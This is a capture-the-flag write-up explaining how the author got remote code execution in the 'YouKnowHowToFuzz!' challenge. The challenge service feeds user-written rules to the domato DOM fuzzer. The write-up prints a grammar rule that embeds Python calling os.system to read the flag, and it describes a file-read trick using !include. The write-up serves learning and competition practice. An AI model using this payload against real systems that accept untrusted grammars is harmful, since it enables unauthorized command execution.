---
title: 'Real World CTF 6th'
challenge: 'YouKnowHowToFuzz!'
date: 2024-01-28T00:00:00+01:00
author: 'v0lp3'
description: 'Writeup for the challenge YouKnowHowToFuzz! of the Real World CTF 6th' 
cover: '/img/RealWorldCTF_6th/logo.png'
tags: ['misc']
draft: false
---

```
I like eat domato, it's excellent for dom fuzz, try to use your rule!

nc 47.251.60.74 9999
```

### Quick look

The challenge attachment includes a Dockerfile that builds a container containing the DOM fuzzer [domato](https://github.com/googleprojectzero/domato)

```Dockerfile
FROM ubuntu:22.04 AS base

RUN apt-get clean && \
    apt-get update && \
    apt-get install -qy git && \
    git clone https://github.com/googleprojectzero/domato /domato

# [...]
```

Then, the container was configured to execute the following script:

```python
#!/usr/local/bin/python3
from grammar import Grammar

print("define your own rule >> ")
your_rule = ""
while True:
    line = input()
    if line == "<EOF>":
        break
    your_rule += line + "\n"

rwctf_grammar = Grammar()
err = rwctf_grammar.parse_from_string(your_rule)

if err > 0:
    print("Grammer Parse Error")
    exit(-1)

rwctf_result = rwctf_grammar._generate_code(10)
with open("/domato/rwctf/template.html", "r") as f:
    template = f.read()

rwctf_result = template.replace("<rwctf>", rwctf_result)

print("your result >> ")
print(rwctf_result)
```

One detail catch my attention in the Dockerfile:

```Dockerfile
# [...]

COPY flag /flag

RUN mkdir /srv/app && \
    mv /flag /srv/app/flag_$(md5sum /flag | awk '{print $1}')

```

This implies that the flag is initially copied to the `/` directory and then renamed with an unpredictable name. Does this suggest that **Remote Code Execution** (*RCE*) is required?

### Vulnerability

Based on the challenge description and the provided code, it became evident that we needed to craft a valid rule in **domato**. My strategy was to refer to the fuzzer's documentation. There, I discovered two approach:

- Use `!include`: This expression allows the reading of arbitrary files and is triggered by the verbose error `Error parsing line: {line of the file}`.
- Use `!begin function`: This expression enables the inclusion of Python code but requires a valid rule.

Leveraging the documentation examples, I successfully created a valid rule. It's worth noting that the **Local File Inclusion** (*LFI*) approach proved futile as we lacked information about the flag's name, which was intentionally made unguessable.

```
!begin function pwn
  import os
  os.system("cat flag*")
  ret_val = "pwned"
!end function

!begin lines
<new naslab> = <call function=pwn>
!end lines
```

The result of the **system** function call will be printed to **stdout**, and we will obtain the flag.

> rwctf{it_is_a_boring_chall_about_domato_rce_20240126rwctf}
